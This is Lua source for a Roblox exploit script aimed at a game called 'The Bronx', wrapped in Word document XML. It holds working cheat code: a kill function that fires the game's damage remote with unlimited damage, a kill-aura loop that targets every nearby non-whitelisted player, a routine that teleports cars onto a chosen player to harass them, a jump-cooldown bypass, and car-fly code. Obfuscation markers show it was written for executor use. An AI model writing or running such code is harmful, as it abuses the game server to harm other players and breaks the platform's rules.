        <w:t xml:space="preserve">                            269514817</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0.5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1.5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        100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false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        3,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Color3.new(1, 0.64705884456635, 0.60000002384186),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        6,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ReplicatedStorage.InflictTarget:FireServer(table.unpack({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "tool"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "target").Character.Humanoid,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "target").Character[hpart],</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    damage,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Server.IgniteScript,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        rawget(data, "tool").GunScript_Server.IcifyScript,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        100,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "target").Character[hpart],</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            1930359546</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1.5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    rawget(data, "hitpos"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Vector3.new(0.074456036090851, -0.099775791168213, -0.99222022294998),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            getgenv().kill_gun = kill_gun</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.KillAura then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChildOfClass("Tool") or not LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Setting") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if table.find(library.whitelist, tostring(Value)) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Value.Character or not Value.Character:FindFirstChildOfClass("Humanoid") or not Value.Character:FindFirstChild("HumanoidRootPart") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character:FindFirstChildOfClass("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character:FindFirstChildOfClass("ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not DistanceCheck(Value, Config.TheBronx.KillAuraRange) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        kill_gun(tostring(Value), 'Head', math.huge)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Get_Vehicle = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.CivCars:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value:FindFirstChild("DriveSeat") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Value.DriveSeat.Occupant then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Value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task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.PlayerUtilities.BugPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart") then continue end                    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Car_To_Use = Get_Vehicle()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Car_To_Use then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Car_To_Use:FindFirstChild("DriveSeat") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Car_To_Use:FindFirstChild("DriveSeat").Occupant then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Car_To_Use:GetAttribute("Usable") or Car_To_Use:GetAttribute("Usable") == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Car_To_Use.DriveSeat:Sit(LocalPlayer.Character.Humanoid)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Car_To_Use:SetAttribute("Usable", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.Jump = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.Sit = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Car_To_Use.PrimaryPart then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Car_To_Use.PrimaryPart = Car_To_Use.Body:FindFirstChild("#Weight")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Car_To_Use:SetPrimaryPartCFrame(Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("HumanoidRootPart").CFrame)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--[[task.spawn(LPH_NO_VIRTUALIZE(function() -- old auto drop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while task.wait(.25) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Config.TheBronx.AutoDrop then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage:WaitForChild("BankProcessRemote"):InvokeServer("Drop", tostring(Config.TheBronx.MoneyAmount))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local UserInputService = game:GetService("UserInputService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>UserInputService.JumpRequest:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local player = game.Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not player then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local character = player.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not character then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local humanoid = character:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not humanoid then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.PlayerModifications.NoJumpCooldown then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if humanoid.FloorMaterial == Enum.Material.Air then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if humanoid.Jump or humanoid:GetState() == Enum.HumanoidStateType.Jumping then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humanoid:ChangeState(Enum.HumanoidStateType.Jumping)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--[[test carfly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RunService = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local UIS = game:GetService("UserInputService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local hum, seat, car, bv, bg</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function Setup()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum = char:FindFirstChildOfClass("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not hum then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    seat = hum.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not seat or not seat:IsA("VehicleSeat") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    car = seat.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not car then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local primary = car.PrimaryPart or car:FindFirstChild("Body") or seat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not primary then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not bv then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv = Instance.new("BodyVelocity")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.MaxForce = Vector3.new(1e7, 1e7, 1e7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Velocity = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Parent = primary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not bg then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg = Instance.new("BodyGyro")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg.MaxTorque = Vector3.new(1e7, 1e7, 1e7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg.P = 15000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg.D = 1200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bg.Parent = primary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>RunService.RenderStepped:Connect(function(dt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.carfly then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if bv then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            bv:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            bv = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if bg then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            bg:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            bg = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end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if not LocalPlayer.Character </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        or not LocalPlayer.Character:FindFirstChildOfClass("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        or not LocalPlayer.Character:FindFirstChildOfClass("Humanoid").SeatPart </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if bv then bv.Velocity = Vector3.zero end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if not hum or hum.Parent ~= LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Setup()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if not seat or not seat:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Setup()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local root = car.PrimaryPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not root then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Setup()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local speed = Config.TheBronx.carflyspeed or 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local cam = workspace.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camLook = cam.CFrame.LookVector</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local camRight = cam.CFrame.RightVector</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if bg then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            bg.CFrame = CFrame.new(root.Position, root.Position + camLook)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-- ✔ HAREKET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local moveDir = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir += camLook end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir -= camLook end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir -= camRight end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir += camRight end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if moveDir.Magnitude &gt; 0 and bv then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Velocity = moveDir.Unit * speed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    elseif bv then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        bv.Velocity = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--test carfly end]]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- CAR FLY FINAL FIXED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RunService = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local UIS = game:GetService("UserInputService")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local LP = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local hum, seat, car, root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local bv, bg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local lastCar</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function Cleanup()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if bv then bv:Destroy() bv = nil end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if bg then bg:Destroy() bg = nil end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function Setup()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Cleanup()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.carfly then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LP.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    hum = char:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not hum then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    seat = hum.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not seat or not seat:IsA("VehicleSeat") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    car = seat.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not car then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    root = car.PrimaryPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not root then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    lastCar = car</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, v in ipairs(car:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if v:IsA("BasePart") and not v.Name:lower():find("wheel") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            v.CanCollide = false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bv = Instance.new("BodyVelocity")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bv.Velocity = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bv.Parent = root</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg = Instance.new("BodyGyro")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg.MaxTorque = Vector3.new(1e9, 1e9, 1e9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg.P = 25000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg.D = 1500</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg.CFrame = root.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    bg.Parent = root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while true do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(0.2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local char = LP.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not char then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local h = char:FindFirstChildWhichIsA("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not h then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local currentSeat = h.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if currentSeat and currentSeat:IsA("VehicleSeat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local newCar = currentSeat.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if newCar ~= lastCar then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.TheBronx.carfly then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Setup()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else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if lastCar then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Cleanup()</w:t>
